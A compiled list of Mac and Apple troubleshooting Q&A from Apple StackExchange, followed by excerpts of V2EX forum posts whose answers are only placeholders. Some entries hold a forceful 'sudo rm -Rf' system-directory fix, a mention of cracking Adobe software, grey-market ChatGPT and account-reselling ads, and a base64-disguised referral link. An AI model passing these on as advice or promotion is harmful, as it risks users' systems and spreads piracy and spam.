+#### 312. Is it possible to play Chess.app in macOS&#39;s Terminal without the graphical interface?
+
+**问题描述 / Problem Description**:
+Tags: terminal | Score: 2 | Views: 397 | Answers: 1 | Created: 2024-10-28
+
+**解决方案 / Solution**:
+Yes, but don't ask me how it works:
+/System/Applications/Chess.app/Contents/Resources/sjeng.ChessEngine
+
+Update: In the same folder as the engine are some data files that appear to be opening books and a sample configuration file. Those need to be copied to your home folder (I assume) in order to use them.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/476383/is-it-possible-to-play-chess-app-in-macoss-terminal-without-the-graphical-inter
+
+---
+
+#### 313. &quot;Command not found: mosh-server&quot; when trying to connect to macOS server running mosh
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, homebrew, ssh, open-source | Score: 2 | Views: 966 | Answers: 2 | Created: 2024-08-19
+
+**解决方案 / Solution**:
+For some reason, homebrew wasn't added to the path in non-interactive shells.
+To fix it, run on the server:
+echo 'export PATH=&quot;/opt/homebrew/bin:$PATH&quot;' &gt;&gt; ~/.zshenv 
+
+or add the following to your ~/.zshenv:
+# Homebrew path support
+if command -v /opt/homebrew/bin/brew &gt;/dev/null 2&gt;&amp;1; then
+  eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;
+fi
+
+Note: This assumes you have an ARM Mac (M1/M2/M3...). On Intel, you need to replace /opt/homebrew with /usr/local.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/474804/command-not-found-mosh-server-when-trying-to-connect-to-macos-server-running
+
+---
+
+#### 314. How to delete all tab groups at once in Safari
+
+**问题描述 / Problem Description**:
+Tags: macos, safari, tabs | Score: 1 | Views: 12 | Answers: 1 | Created: 2026-04-27
+
+**解决方案 / Solution**:
+No way to delete all tab groups at once via Safari UI. But tab groups are stored in the sqlite3 database under ~/Library/Containers/com.apple.Safari/Data/Library/Safari/SafariTabs.db. So removing that database will clear all tab groups.
+Quit Safari, then open the Terminal.app:
+# Backup database file to Desktop incase something goes wrong:
+mv ~/Library/Containers/com.apple.Safari/Data/Library/Safari/SafariTabs.db ~/Desktop
+# Delete related files (refer to Sqlite 3 documentation for details)
+rm SafariTabs.db-shm SafariTabs.db-wal
+
+Now re-run Safari and all tab groups including opened tabs from the last session are gone.
+If you check the ~/Library/Containers/com.apple.Safari/Data/Library/Safari/ directory, you will find out that Safari will automatically create the SafariTabs.db file again.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486303/how-to-delete-all-tab-groups-at-once-in-safari
+
+---
+
+#### 315. Ken Burns screensaver effect maxing out CPU and GPU
+
+**问题描述 / Problem Description**:
+Tags: macos, performance, gpu, cpu, screensaver | Score: 1 | Views: 46 | Answers: 1 | Created: 2026-04-18
+
+**解决方案 / Solution**:
+So for anyone who finds this, the image resolution was the main factor. I batch resized them in Photoshop to a width of 3840 (many of them were rendered out in Blender at 7680) and the performance seems fine now - though it still leans heavily on the GPU it doesn't end up blurry. I suspect the resolution and quantity (74, but not all huge like that) was enough to do it.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486248/ken-burns-screensaver-effect-maxing-out-cpu-and-gpu
+
+---
+
+#### 316. MacBook Air M2 thermal throttling causes severe screen sharing lag in Teams and Zoom — any macOS-level fixes?
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, performance, cpu | Score: 1 | Views: 259 | Answers: 2 | Created: 2026-04-08
+
+**解决方案 / Solution**:
+Before starting the call, launch Activity Monitor and see whether any other processes are using a lot of energy. Quit them, if so.
+Otherwise, use an external cooling device such as a thermoelectric cooling stand. Even a passive device that raises the bottom cover off the desktop so air can circulate may help.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486196/macbook-air-m2-thermal-throttling-causes-severe-screen-sharing-lag-in-teams-and
+
+---
+
+#### 317. Why is SSH failing on macOS 26.3?
+
+**问题描述 / Problem Description**:
+Tags: macos, ssh | Score: 1 | Views: 248 | Answers: 1 | Created: 2026-04-01
+
+**解决方案 / Solution**:
+The process gets hung up at the last line in the debug. Thinking that maybe that’s why SSH won’t launch, I removed the file and the directory and everything works. Even BBEdit.
+sudo rm -Rf /var/run/com.apple.launchd.YUMtRKxnS6/Listeners
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486167/why-is-ssh-failing-on-macos-26-3
+
+---
+
+#### 318. How to auto-fit column width in Finder under Tahoe with scroll bars always on?
+
+**问题描述 / Problem Description**:
+Tags: macos, finder, tahoe | Score: 1 | Views: 99 | Answers: 1 | Created: 2026-03-14
+
+**解决方案 / Solution**:
+This is a bug/mess in macOS 26.  See this post from Jeff Johnson https://lapcatsoftware.com/articles/2026/2/4.html
+The exact behaviour has changed with each minor version of macOS 26.  I am running macOS 26.3.1.  I am pretty sure that you are running an earlier version. With 26.3.1, I can double click on the target at the bottom of the scroll bar.  It is no longer hidden by the horizontal scroll bar.
+The fix is for you (or your IT department) to update your Mac to 26.3.1.
+Of course, this may change in the future as Apple tinker with the Liquid Glass interface.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486054/how-to-auto-fit-column-width-in-finder-under-tahoe-with-scroll-bars-always-on
+
+---
+
+#### 319. Why does my MacBook iMessage app keeps on getting out of sync with iMessage app on my iPhone?
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, data-synchronization | Score: 1 | Views: 50 | Answers: 1 | Created: 2026-03-07
+
+**解决方案 / Solution**:
+Check you are logged into iCloud on both devices. There is a Messages setting available in the iCloud settings on both OS that controls syncing.
+Settings | iCloud | Messages | Use on this iPhone / Mac
+This dialog will also show the sync status, and allow a manual sync
+Information correct as per iOS 26.3.1 and macOS 26.3.1
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486006/why-does-my-macbook-imessage-app-keeps-on-getting-out-of-sync-with-imessage-app
+
+---
+
+#### 320. How does one create a new Calendar event using the cursor at the same time as an existing event?
+
+**问题描述 / Problem Description**:
+Tags: macos, calendar | Score: 1 | Views: 56 | Answers: 1 | Created: 2026-03-05
+
+**解决方案 / Solution**:
+Right click the existing event
+Select Duplicate
+Double-click on duplicated event and edit with next event info
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485992/how-does-one-create-a-new-calendar-event-using-the-cursor-at-the-same-time-as-an
+
+---
+
+#### 321. Move iCloud Drive to External Drive
+
+**问题描述 / Problem Description**:
+Tags: macos, icloud, hard-drive, storage | Score: 1 | Views: 107 | Answers: 1 | Created: 2026-03-04
+
+**解决方案 / Solution**:
+iCloud is a syncing solution, putting on an external drive will lead to problems as soon as your Mac without it the first time.
+What you can do instead:
+
+Enable &quot;Optimize Mac Storage&quot; in System Settings -&gt; iCloud -&gt; iDrive. This will allow macOS to offload files in your iDrive to iCloud and only keep a stub on the disk itself. If you access such a file, it will be automatically get downloaded
+Move the first 50 GB from your OneDrive to your iCloud Drive folder on the Mac and wait til it is fully synchronized to iCloud (may take a day or two, depending on network speed etc)
+Open the iCloud Drive folder, right-click on folders you seldom need and select &quot;Remove Download&quot;. macOS does manage storage automatically, but this speeds up the process
+Once enough disk space is available again, move the remaining data from OneDrive to your iCloud Drive folder (and may repeat the forced removal after the sync is done).
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485980/move-icloud-drive-to-external-drive
+
+---
+
+#### 322. Why am I unable to enroll certain MacBooks in Apple Business Essentials? &quot;Enrollment failed. Please try again.&quot;
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, mdm, apple-business | Score: 1 | Views: 229 | Answers: 2 | Created: 2025-12-02
+
+**解决方案 / Solution**:
+If you released these devices from the organization (something that happens server side regardless of the state of the device), they are done and can not be managed again.
+
+https://support.apple.com/guide/apple-business-manager/release-devices-axmec4d28461/web
+
+I would contact Apple to determine the state of these few devices and then the appropriate steps to re-enroll or replace them with devices that can be managed under ABM.
+They also can explain exactly which log file to look at on the OS in question (or read the server side logs if needed). Those devices that show their serial in your account are likely to be re-enrolled the next time they have to activate, so back up the data on the device, erase all content and settings, see the device get managed (or collect the error logs) and then restore the data once the device is managed and enrolled in the MDM.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/484291/why-am-i-unable-to-enroll-certain-macbooks-in-apple-business-essentials-enroll
+
+---
+
+#### 323. Fans run at 100%, cpu under clocked, even though temps are low
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, hardware, performance, temperature | Score: 1 | Views: 102 | Answers: 1 | Created: 2025-11-29
+
+**解决方案 / Solution**:
+After about 3 days, the palm rest sensor started working again, fans and CPU are back to normal. My best guess is that somehow the humidity and sand of my beach trip got into the trackpad. I hope apple improves the crappy design of this clamshell, which has no mesh on the bottom vents leading to a lot of dust buildup over time.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/484252/fans-run-at-100-cpu-under-clocked-even-though-temps-are-low
+
+---
+
+#### 324. Using external monitor only without consistent electricity
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, display, security, mdm | Score: 1 | Views: 93 | Answers: 2 | Created: 2025-11-04
+
+**解决方案 / Solution**:
+You are solving the wrong problem.
+The Mac loses power, so it goes to sleep.
+The power fluctuation you describe (1-5 times per hour) is bad for your Mac.  You should provide a UPS for the Mac that will cover these power issues.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/484019/using-external-monitor-only-without-consistent-electricity
+
+---
+
+#### 325. Are MacBook serial numbers paired to any internal hardware components?
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, hardware, serial-number | Score: 1 | Views: 218 | Answers: 1 | Created: 2025-11-03
+
+**解决方案 / Solution**:
+There are certainly a number of 2D barcodes identifiers found on the MacBook's logic boards and components as demonstrated by the examples below all gathered off the internet. Given the happenstance nature of spotting a barcode in these various contexts there was no means to corroborate these codes against the serial numbers of the units to verify a pairing. However at the least there could be a pairing since at least it has been established that these identifiers of some kind exist, the open question is whether they unique to the device. I scanned all the barcodes below that could be successfully scanned using screenshots scanned with a Zebra DS22 barcode scanner. (Note the next repair attempt I will scan my actual hardware to corroborate the numbers against the device's actual serial number and update this post with the findings of that experiment, the device is currently reassembled un unable to be photographed and scanned at this time.)
+Logic Board
+Here's an example of a 2D barcode showing up on the logic board PCB found on eBay.
+
+The identifying text next to the code on a logic board reads as
+
+C02220700
+EA02K4 AW
+OEO 3.5G 32G
+
+The 2D barcode was scanned and decoded as J02220700&gt;A02T4A&lt;.
+Wireless Module
+Here's an example of a barcode printed on a Wireless Module witnessed in the following YouTube repair video.
+
+My scanner read the code as 21031805010421120880083035, a 26 character number where the last 8 digits are also printed on chip packaging.
+
+USI
+339S00758
+80083035
+
+(Apparently this is a Apple USI 339S00758 – Wi-Fi 6/Bluetooth 5.0 module; see also
+MacBook Pro network card)
+Flash NAND Chips
+Here's an example from a YouTube teardown video bringing into view some silver packaged Flash NAND chips used for the hard drive. There's other barcoded components visible on image as well, two of which my scanner was able to read, though the clarity was lacking I assume there's typos (Apple’s M3 MacBook Air Features Two NAND Flash Chips, Resulting In Faster SSD Speeds Compared To The Single Chip Used On The M2 Version)
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/484008/are-macbook-serial-numbers-paired-to-any-internal-hardware-components
+
+---
+
+#### 326. How to see which terminal programs are using the most energy?
+
+**问题描述 / Problem Description**:
+Tags: macos, terminal | Score: 1 | Views: 151 | Answers: 1 | Created: 2025-10-21
+
+**解决方案 / Solution**:
+Apple's Energy Impact is a poor measure for most situations. Prefer traditional underlying CPU and memory measurements, such as those seen in top and equivalent tools.
+The Activity Monitor User Guide says:
+
+
+Energy Impact: A relative measure of the current energy consumption of the app (lower is better).
+
+
+This appears to be all Apple publish on the value.
+Nicholas Nethercote's What does the OS X Activity Monitor’s “Energy Impact” actually measure? dives into the metric and how it might be derived:
+
+So, in conclusion, on 10.10 and 10.11, the formula used to compute “Energy Impact” is machine model-specific, and includes the following factors: CPU usage, wakeup frequency, quality of service class usage, and disk, GPU, and network activity.
+
+Unfortunately, it appears the original question can not be authoritatively answered by anyone outside of Apple.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481908/how-to-see-which-terminal-programs-are-using-the-most-energy
+
+---
+
+#### 327. Apps won&#39;t get removed from dock and show as &quot;running in background&quot; since I updated to macOS 26
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro | Score: 1 | Views: 303 | Answers: 1 | Created: 2025-10-19
+
+**解决方案 / Solution**:
+Issue: MacOS 26.1 Beta bug
+Fix: Updated to 26.1 Beta (25B5072a) and that fixed the bug!
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481893/apps-wont-get-removed-from-dock-and-show-as-running-in-background-since-i-upd
+
+---
+
+#### 328. Clear output in macOS Terminal in Python script on Big Sur works, but not on Sequoia
+
+**问题描述 / Problem Description**:
+Tags: macos, terminal, python, alias | Score: 1 | Views: 190 | Answers: 2 | Created: 2025-10-14
+
+**解决方案 / Solution**:
+I use alias cls='tput clear' for the shell rather than depending on sending arbitrary control codes to the terminal.
+In python, you would just use os.system('tput clear').
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481844/clear-output-in-macos-terminal-in-python-script-on-big-sur-works-but-not-on-seq
+
+---
+
+#### 329. Error: Xcode alone is not sufficient on Ventura
+
+**问题描述 / Problem Description**:
+Tags: xcode, homebrew, ventura | Score: 1 | Views: 344 | Answers: 2 | Created: 2025-10-08
+
+**解决方案 / Solution**:
+You didn't do what the message said, you installed XCode instead, then deleted the CLT (Command Line Tools) instance instead of updating it.
+Use xcode-select --install to reinstall the CLT, which is what Homebrew wants.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481782/error-xcode-alone-is-not-sufficient-on-ventura
+
+---
+
+#### 330. How to tune &quot;optimized battery charging&quot; in macOS?
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, battery, charging | Score: 1 | Views: 326 | Answers: 1 | Created: 2025-09-15
+
+**解决方案 / Solution**:
+Put the Mac (or yourself) on a timer and cut off power 2 hours before the earliest wake time should feed a new schedule to tell your Mac finish charging earlier.
+Or disable that feature if you decide it’s not worth retraining the algorithm with consistent earlier power state changes.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481519/how-to-tune-optimized-battery-charging-in-macos
+
+---
+
+#### 331. [V2EX] 求助： mbp m1 合盖不熄屏
+
+**问题描述 / Problem Description**:
+1. 左上角休眠按钮被禁用2. 天才吧没看出什么问题，让我重装。测试硬件正常3. 新建账号问题依旧有没有遇到过的 v 友指点一下，如需什么细节我再提供
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208919#reply6
+
+---
+
+#### 332. [V2EX] Adobe Lightroom / BR 闪退/异常（Mac 版）
+
+**问题描述 / Problem Description**:
+我目前 2 台 MacBook Pro ， 旧的装的 BR 和 LR （ 2022 ）都是正常使用， 然而另一台新买的 安装 BR/LR 2024 ～ 2026 版都是各种 bug 或者闪退。
+不知道什么原因？ 不知道怎么解决？
+就算是从官方 ACC 下载的， 然后再用软件破解……最后还是有问题
+哪位大佬能知道原因和解决办法？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208903#reply4
+
+---
+
+#### 333. [V2EX] 第一个运行在苹果沙箱内的 OpenClaw 版本 CrabDesktop
+
+**问题描述 / Problem Description**:
+小龙虾🦞都过气了，我的龙虾 app 才过审，人生第一个 mac app ，缺乏审核经验。主打安全，运行在苹果沙箱内，原价 9.99$，现在优惠券免费使用，https://apps.apple.com/us/app/crabdesktop/id6760459522?mt=12 CrabDesktop 
+J7N4A6RKPK7T 
+6XTTTNWRYXEY 
+W6FA3JW34NYA 
+7339JLY6MEWX 
+HWXX6MPNAK7J 
+L4RW3F9LR4XA 
+MFXRT6LMMRAJ 
+MPY6YRJFPTXE 
+TFNMMER9H994 
+MNHRP3YXA76H
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1206213#reply17
+
+---
+
+#### 334. [V2EX] mac 上面有免费的 ftp 工具吗
+
+**问题描述 / Problem Description**:
+之前一直用的 scp
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1206113#reply14
+
+---
+
+#### 335. [V2EX] macos 五指捏合和四指捏合都会显示 spotlight，我不想让四指捏合显示
+
+**问题描述 / Problem Description**:
+最近用四指捏合经常误触显示 spotlight 。
+原因是 macos 五指捏合和四指捏合都会显示 spotlight ，我不想让四指捏合显示
+请问有办法吗
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1205918#reply4
+
+---
+
+#### 336. [V2EX] 预定 M5 pro 64G+1T 版本 macbook pro 的朋友都是等了多久拿到货的呀？
+
+**问题描述 / Problem Description**:
+3 月 21 在麦克先生那里预定了一台 14 寸 M5 pro 64G+1T 版本，当时说是大概 4-5 周发货。现在 5 周过去了还是没有消息。想问问大家买的同配置都是多久到货的？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208802#reply21
+
+---
+
+#### 337. [V2EX] 推荐个 mac 的显示器吧？ 618 想搞一个
+
+**问题描述 / Problem Description**:
+2000 左右的
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208488#reply41
+
+---
+
+#### 338. [V2EX] 有更新了 ios18.7.8 的 V 友吗？
+
+**问题描述 / Problem Description**:
+说说续航发热怎么样，有没有什么 bug ？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208379#reply8
+
+---
+
+#### 339. [V2EX] 看上了苹果店里展示 MacBook Neo 的那个垫子，哪里能买到？
+
+**问题描述 / Problem Description**:
+电脑一般般，但是那个垫子感觉真不错。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208325#reply17
+
+---
+
+#### 340. [V2EX] 中国账号开始强制 iCloud 云贵
+
+**问题描述 / Problem Description**:
+注册或者切换国家为中国时必须同意云上贵州协议才可以之前可以单独改地区为中国，iCloud 是独立的，不同意不影响账号改区到中国，最多 iCloud 不可用
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208141#reply23
+
+---
+
+#### 341. [V2EX] Apple 地图规划出了“不存在”的线路
+
+**问题描述 / Problem Description**:
+今天上午 10 点南京 S2 地铁开通运营，目前高德地图已经可以正常显示，但是 Apple 地图存在了滞后的情况，但是路线规划已经可以规划出来，出现了比较罕见的未能在地图正常显示的路线的情况。之前有人争论 Apple 地图只是底图来自高德，算法是 Apple 自己的，现在这种情况就是可以充分证明导航算法其实也是来自高德的。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1207688#reply9
+
+---
+
+#### 342. [V2EX] 请问现在 Apple ID 土区注册问题
+
+**问题描述 / Problem Description**:
+哪位佬有土区注册教程？发现现在注册 Apple ID ，国家选择土耳其，手机号是国内，不开代理注册，在输入图片验证码环节就提示当前无法创建，后面代理挂了 hk 和新加坡全局，但是走到完邮箱验证吗和最后手机验证码环节后也提示当前无法创建此账号，请问还有什么办法现在可以创建土区账号或者尼区账号呢？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1207624#reply31
+
+---
+
+#### 343. [V2EX] 请问下，市面上那些卖苹果账号的，是怎么做的呢？
+
+**问题描述 / Problem Description**:
+如题，注册苹果账号不是需要绑定手机号吗，现在搞个手机号也麻烦，他们是怎么做到批量批发的？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1207465#reply7
+
+---
+
+#### 344. [V2EX] 2026 年使用 邮箱 在 设置 中注册 任意地区 新 Apple ID 保姆级教程，解决注册风控问题
+
+**问题描述 / Problem Description**:
+前置准备
+
+一台 iPhone 或 iPad
+一个可用的电子邮箱（ Gmail 、Outlook 等）
+一个可以接收短信或者接听电话的电话号码
+⚠️ 注意：注册地区 = 当前装置的系统地区设定，请在注册前先确认装置地区是否正确
+
+
+第一步：确认装置地区
+前往 设置 → 通用 → 语言与地区 → 地区，语言无需修改，确认地区与你想注册的 Apple ID 地区一致。
+
+例如：想注册美区 Apple ID ，请将装置地区设为「美国」，尼日利亚同理。
+
+
+第二步：进入邮件账户设置（重要‼️）
+
+打开设置 App
+向下滚动，点击「邮件」
+点击「账户」
+点击「加入新账户」
+在列表中选择「iCloud」
+
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1207433#reply41
+
+---
+
+#### 345. [V2EX] 官网买的 Apple 礼品卡多久到账啊？
+
+**问题描述 / Problem Description**:
+昨天在官网用招行 visa 买了张 200 刀的礼品卡，已经 26 小时了还在 Processing 阶段。。。。。
+大家都是多久收到的啊？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1207398#reply48
+
+---
+
+#### 346. [V2EX] V2 魔怔人为什么这么多？
+
+**问题描述 / Problem Description**:
+今天有个热帖，讨论鸿蒙智行的，现已经到水深火热了，我不过就是在里面感叹一句，华为手机从当年使用火龙 888 ，到 2026 年目前为止出货量国内第一，就这都要被喷？是不是在 V 社说起华为，必须要喷华为才行，其他任何行为都是禁止的？是不是有点魔怔了？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208960#reply11
+
+---
+
+#### 347. [V2EX] 偶然看到一篇文章《文化已死：当绝大多数人听的音乐，读的书都来自 10 年前》，给大家推荐一下，非常值得一看
+
+**问题描述 / Problem Description**:
+先说一下我的读后感，就是恍然大悟的感觉，当然，因为我已经奔 50 了，所以听的音乐大概是 2 、30 年前的。
+看的书倒是大部分是新书，因为我经常是在 YouTube 上看到了感兴趣的书的介绍，然后再去看，最近看完的书《制度基因》是 25 年出版的。
+文中最后一句：在这个宣称“文化自信”的国家，文化已经死了。振聋发聩，不知该作何感想。
+原文地址： https://chinadigitaltimes.net/chinese/726807.html
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208941#reply2
+
+---
+
+#### 348. [V2EX] 66 个入狱教程
+
+**问题描述 / Problem Description**:
+时至今日，金句依然
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208876#reply1
+
+---
+
+#### 349. [V2EX] 国家超算互联网平台提供 Coding Plan(20 元/100 元两档)
+
+**问题描述 / Problem Description**:
+刚刚发现的,属于国家超算中心,由曙光信息运营, 套餐用量与阿里腾讯京东齐平,但是目前 5 折优惠中 
+不足之处: 模型数量上不完整(MiniMax-M2.5 、Qwen3-235B-A22B, 其他接入中),可观望,也可先用着  
+套餐地址:
+https://www.scnet.cn/ui/console/index.html#/llm/coding-plan
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208813#reply14
+
+---
+
+#### 350. [V2EX] supergeo.info 送兑换码
+
+**问题描述 / Problem Description**:
+SuperGeo Starter 套餐兑换码
+本次共发放 50 个 Starter 套餐，先到先得。
+入口：https://supergeo.info
+兑换码
+
+SG-DCC5-XAVE-IJWQ
+SG-6N77-CSTH-7NX7
+SG-BYRK-BOQB-EPKT
+SG-U6NS-BJXJ-OMCU
+SG-BUR6-6PS0-EVL2
+SG-TQWA-V7TV-BJY2
+SG-HBJZ-R7RD-PDGS
+SG-QAOY-368T-NTNV
+SG-KXUY-W0MJ-RQBT
+SG-QEZC-QA3Q-XJYB
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208796#reply3
+
+---
+
+#### 351. [V2EX] ChatGPT Plus 会员一个月 30 元 自助充值！
+
+**问题描述 / Problem Description**:
+ChatGPT Plus 会员 一个月 30 元自助充值
+购买地址 https://abcnum.com/products/gptplus
+随时断货 需要的速度购买
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208680#reply3
+
+---
+
+#### 352. [V2EX] 古风提示词
+
+**问题描述 / Problem Description**:
+生成一张富有诗意且视觉上层次丰富的诗歌解析海报。海报结构和风格要根据用户输入的诗句、名词或地点定制，确保
+具有强烈的文学氛围和艺术感。
+基本要求：
+
+
+海报标题：海报上方使用霸气的手写体大字，字形优雅且充满气势。大字应为用户提供的诗句或与名词/地点相关的主题。字形应与海报的整体艺术风格协调，并且营造出强烈的视觉冲击。
+
+
+文字排版：标题下方应有小字或小图形排版，包含相关的解析或引文，内容可以是对诗句的注释、相关背景的介绍或象征性字词的解释。小字的排版要有设计感，形成对比和节奏感，增强视觉层次。
+
+
+知识点：将 5 至 10 个相关知识点融入海报设计。用户需要提供一个主题（如诗句、名词或地点），
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208653#reply0
+
+---
+
+#### 353. [V2EX] 飞机上 Starlink 测速
+
+**问题描述 / Problem Description**:
+比上一代飞机上的 Wi-Fi 快多了，基本上和地面没有使用上的区别。（除了飞机上不能使用视屏通话）
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208600#reply55
+
+---
+
+#### 354. [V2EX] GPT Image 2 韩文 prompt 实测：不是“能看懂”，而是“能还原”
+
+**问题描述 / Problem Description**:
+GPT Image 2 韩文提示词实测
+这次测试 GPT Image 2 ，最明显的感受是：它对韩文 prompt 的理解不是简单翻译，而是真的能抓住细节。
+测试用的韩文提示词是：
+
+엄청 인형같은 얼굴의 K팝 여자 아이돌이 금색 여름 해변 의상을 입고 한국 잡지 표지 모델을 장식한 모습을 표현. 표지 문구에는 아이돌에 대한 소개 글이 들어가도록 표현. 아이돌의 이름은 여성스러운 이름으로 표현.
+
+
+生成结果里，K-pop 女偶像、金色夏季服装、韩国杂志封面、介绍文字和女性化名字这些元素都能被准确呈现。尤其是“인형같은 얼굴”这种带审美倾向的描述，模型没有粗暴处理成普通
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208481#reply3
+
+---
+
+#### 355. [V2EX] 网页端 GPT-5.5 Thinking 体感好快啊，这速度第一反应还以为是降智到 4o-mini 了
+
+**问题描述 / Problem Description**:
+体感速度大概有 5 倍的提升，而且输出文字的速度也比 5.4 Thinking 快多了
+之前用基本上都是问完后切别的窗口干别的事去了，现在可以等在这里，很快就回答完了
+不清楚思考这么快，对能力是否有影响
+
+与之前的不严谨对比（思考时间）
+GPT-5.5 Thinking
+
+GPT-5.4 Thinking
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208443#reply4
+
+---
+
+#### 356. [V2EX] 新开中转站，有 GPT 包月可以薅，分享给有缘人
+
+**问题描述 / Problem Description**:
+最近各种中转站由于 plus 、pro 渠道死了，codex 包月都转流量了，苦苦寻觅了一个新大佬开的中转站，特来分享给有缘人。openai gpt5.5,gpt-image-2 开通上线base64：aHR0cHM6Ly9jbi5jaHJvdXRlci5jb206ODQ0My9yZWdpc3Rlcj9hZ2VudF9jb2RlPWhqLTAwMDA4
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208442#reply6
+
+---
+
+#### 357. [V2EX] 小红书下场做 app 工厂
+
+**问题描述 / Problem Description**:
+圆周和 sigma 那几个每天都能刷到一群广告，还都挺直接的，这是内部转型还是说测试投放系统？代码不值钱了，大家都拼命卷了。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208437#reply7
+
+---
+
+#### 358. [V2EX] 做了一个 GEO 工具平台，想听听大家对 AI 搜索优化的看法
+
+**问题描述 / Problem Description**:
+做了一个 GEO 工具平台，想听听大家对 AI 搜索优化的看法
+最近一直在关注一个变化：越来越多问题，用户已经不是先去搜索引擎翻网页了，而是直接问 ChatGPT 、豆包、Kimi 、文心、Perplexity 这类 AI 工具。
+传统 SEO 解决的是“我的页面能不能排在搜索结果前面”，但在 AI 搜索里，新的问题变成了：
+我的内容能不能被 AI 理解？
+能不能被它引用？
+当用户问某个行业、产品或问题时，AI 给出的答案里会不会出现我的品牌、网站或内容？
+我感觉 GEO ，也就是 Generative Engine Optimization ，应该会是一个比较确定的趋势。尤其是对内容站、独立
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208433#reply14
+
+---
+
+#### 359. [V2EX] XChat 正式上架 App Store 了
+
+**问题描述 / Problem Description**:
+有些失望，就是 X 的一个聊天 Tab 独立为 XChat 了，替代不了 TG ，也替代不了微信。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208417#reply30
+
+---
+
+#### 360. [V2EX] 记一次 QQ 被盗事件记录
+
+**问题描述 / Problem Description**:
+QQ 被盗事件记录
+基本信息
+
+手机号码：1*********（中国联通）
+设备：iPhone （最新系统，无越狱）
+使用习惯：平时使用非中国大陆 eSIM ，联通号码通常不启用，需要时才临时开启
